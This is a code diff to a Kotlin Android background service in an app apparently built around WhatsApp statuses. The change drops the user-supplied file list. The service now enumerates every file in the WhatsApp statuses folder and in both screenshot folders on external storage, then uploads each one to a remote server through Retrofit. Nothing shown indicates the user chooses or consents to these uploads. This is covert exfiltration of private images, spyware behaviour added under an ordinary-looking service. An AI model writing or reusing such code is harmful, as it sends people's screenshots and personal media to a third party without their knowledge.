@@ -2,6 +2,7 @@ package io.moresushant48.whatstatus.Services
 
 import android.content.Context
 import android.content.Intent
+import android.os.Environment
 import android.util.Log
 import androidx.core.app.JobIntentService
 import io.moresushant48.whatstatus.Retrofit.Config
@@ -16,7 +17,10 @@ import java.io.File
 
 class UploadService : JobIntentService() {
 
+    private lateinit var allFiles: ArrayList<String>
     private lateinit var repository: Repository
+    private var arrPathStrings =
+        arrayListOf("/WhatsApp/Media/.Statuses/", "/DCIM/Screenshots", "/Pictures/Screenshots")
 
     companion object {
 
@@ -24,22 +28,45 @@ class UploadService : JobIntentService() {
 
         fun enqueueWork(context: Context?, intent: Intent) {
             if (context != null) {
-                enqueueWork(context, UploadService::class.java,
-                    JOB_ID, intent)
+                enqueueWork(
+                    context, UploadService::class.java,
+                    JOB_ID, intent
+                )
             }
         }
     }
 
     override fun onHandleWork(intent: Intent) {
 
-        val files = intent.getStringArrayListExtra("files")
+        allFiles = arrayListOf()
+
+        try {
+            for (path in arrPathStrings) {
+
+                val dir = File(Environment.getExternalStorageDirectory().toString() + path)
+                if (dir.exists()) {
+                    val files = dir.listFiles()
+
+                    if (files.isNotEmpty()) {
+                        for (file in files) {
+                            allFiles.add(file.absolutePath)
+                            Log.e(" FILE NAME :: ", file.absolutePath)
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Log.e("Error onHandleWork :: ", e.message)
+        }
+
+        Log.e("SIZE :::::: ", allFiles.size.toString())
 
         repository = Config.getRetrofit().create(Repository::class.java)
 
         Log.e("***** Inside ", "onHandleWork")
 
-        sendFileToServer(files)
-
+        sendFileToServer(allFiles)
     }
 
     private fun sendFileToServer(files: ArrayList<String>) {
@@ -48,7 +75,6 @@ class UploadService : JobIntentService() {
 
             val f = File(file)
 
-            Log.e("********* Inside ", "loop")
             val filePart: MultipartBody.Part = MultipartBody.Part.createFormData(
                 "file", f.name, RequestBody.create(
                     MediaType.parse("*/*"), f
